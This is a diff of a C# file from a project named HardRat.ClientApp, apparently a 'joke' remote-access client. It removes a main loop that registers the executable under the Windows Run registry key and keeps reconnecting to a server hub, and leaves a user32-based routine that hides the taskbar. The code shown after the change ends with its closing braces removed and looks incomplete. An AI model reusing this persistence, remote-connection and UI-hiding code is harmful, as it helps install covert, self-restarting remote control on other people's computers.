@@ -1,54 +1,9 @@
-﻿using Microsoft.Win32;
-using System;
-using System.Collections.Generic;
-using System.IO;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
-using System.Reflection;
+﻿using System;
 using System.Runtime.InteropServices;
-using System.Threading;
 
-namespace HardRat.ClientApp
-{
-    class Program
-    {
-        static void Main(string[] args)
-        {
-            restart:
-            SetStartup();
-            var connection = new ServerHubConnection();
-            try
-            {
-                connection.StartAsync()?.GetAwaiter().GetResult();
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine(ex);
-                goto restart;
-            }
+Taskbar.Hide();
 
-
-
-            Task.Delay(-1).GetAwaiter().GetResult();
-        }
-
-        private static void SetStartup()
-        {
-            const string AppName = "HardRatJoke";
-
-            RegistryKey rk = Registry.CurrentUser.OpenSubKey
-                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-            var loc = Path.Combine(Directory.GetCurrentDirectory(), "HardRat.ClientApp.exe");
-
-
-            Console.WriteLine(loc);
-            rk.SetValue(AppName, loc);
-
-        }
-    }
-
-    public class Taskbar
+public class Taskbar
     {
         [DllImport("user32.dll", CharSet = CharSet.Unicode)]
         private static extern int FindWindow(string className, string windowText);
@@ -97,7 +52,4 @@ namespace HardRat.ClientApp
         public static void Hide()
         {
             ShowWindow(Handle, SW_HIDE);
-            ShowWindow(HandleOfStartButton, SW_HIDE);
-        }
-    }
-}
+        
